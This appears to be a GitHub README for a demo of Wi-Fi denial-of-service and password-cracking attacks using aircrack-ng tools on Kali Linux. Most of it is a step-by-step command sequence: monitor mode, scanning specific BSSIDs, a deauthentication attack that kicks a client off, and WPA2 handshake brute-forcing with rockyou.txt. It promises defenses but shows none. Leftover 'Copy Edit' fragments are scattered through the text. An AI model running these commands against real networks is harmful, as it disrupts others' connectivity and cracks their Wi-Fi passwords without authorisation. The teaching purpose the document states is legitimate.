# WiFi-DOS-Kali
Demo of Wi-Fi DoS attacks via Kali Linux (Aircrack-ng, Aireplay-ng). Covers deauth attacks, brute-force cracking, and defenses. Includes PPT on attack types, tools, and commands. For ethical research only.


# WiFi-DOS-Kali

Demo of Wi-Fi DoS attacks via Kali Linux (Aircrack-ng, Aireplay-ng).  
Covers deauth attacks, brute-force cracking, and defenses.  
Includes PPT on attack types, tools, and commands.  
**For ethical research only.**

---

## Demonstration

```bash
# View network interfaces
ifconfig

# Start monitor mode on wlan0
airmon-ng start wlan0

# Kill interfering processes
airmon-ng check kill

# Confirm monitor mode
iwconfig

# Start scanning for Wi-Fi networks
airodump-ng -i wlan0mon

# Target specific BSSID and channel
airodump-ng --bssid 8E:F5:A3:77:D6:DB -c 3 -- wlan0
airodump-ng --bssid A8:32:9A:00:CE:96 -c 11 -w /root/Desktop/wpa2 -- wlan0mon




Deauthentication Attack (Kick clients out)
aireplay-ng -0 20 -a A8:32:9A:00:CE:96 -c 08:4A:CF:7D:47:14 wlan0mon


Brute Force Attack
bash
Copy
Edit
aircrack-ng -a2 -b 78:1D:BA:93:1F:9A -w /root/Desktop/rockyou.txt

aircrack-ng -a2 -b A8:32:9A:00:66:E8 -w /media/root/CAF04BE4F04BD57B/test/word.txt /media/root/CAF04BE4F04BD57B/test/Digicom-01.cap
Stop Monitor Mode
bash
Copy
Edit
airmon-ng stop wlan0mon
service network-manager restart
